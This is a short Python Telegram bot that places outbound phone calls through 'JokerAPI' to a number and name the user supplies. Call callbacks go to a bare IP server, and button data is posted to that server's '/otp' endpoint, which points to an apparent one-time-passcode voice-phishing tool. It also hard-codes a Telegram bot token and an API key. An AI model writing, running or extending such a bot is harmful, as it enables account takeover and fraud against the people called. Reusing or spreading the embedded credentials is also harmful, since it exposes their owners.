import requests
import logging
from aiogram import Bot, Dispatcher, types
import JokerAPI
import aiohttp
import json
API_TOKEN = '6409753184:AAGdJ3GBWBM2TkeFaJ-8nLB4qsjQakVy4AQ'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start', 'help'])
async def send_welcome(message: types.Message):
    await message.reply("Hi!\nI'm a bot to make calls via Joker API!\nUse /call to make a call.")

@dp.message_handler(commands=['call'])
async def make_call(message: types.Message):
    chat_id = message.chat.id
    msg = message.text.split()
    print(chat_id)
    if len(msg) == 3:
        number = str(msg[1])
        name = msg[2]
        call = JokerAPI.client.create_outbound_call(
            apiKey = "VJJN9z4HFlnTDH5MImRTB13iAXNBb3Jh",
            to = number,
            from_ = "16233884223",
            callbackUrl = "http://172.104.247.154:8080/makecall/"+str(chat_id)+"/"+name
)

    await message.reply(name)


@dp.callback_query_handler(lambda c: c.data)
async def process_callback(callback_query: types.CallbackQuery):
    server_url = "http://172.104.247.154:8080/otp"
    data = json.loads(callback_query.data)

    async with aiohttp.ClientSession() as session:
        async with session.post(server_url, json=data) as response:
            response_data = await response.text()

    await bot.answer_callback_query(callback_query.id)

if __name__ == '__main__':
    from aiogram import executor

    logging.basicConfig(level=logging.INFO)

    executor.start_polling(dp, skip_updates=True)
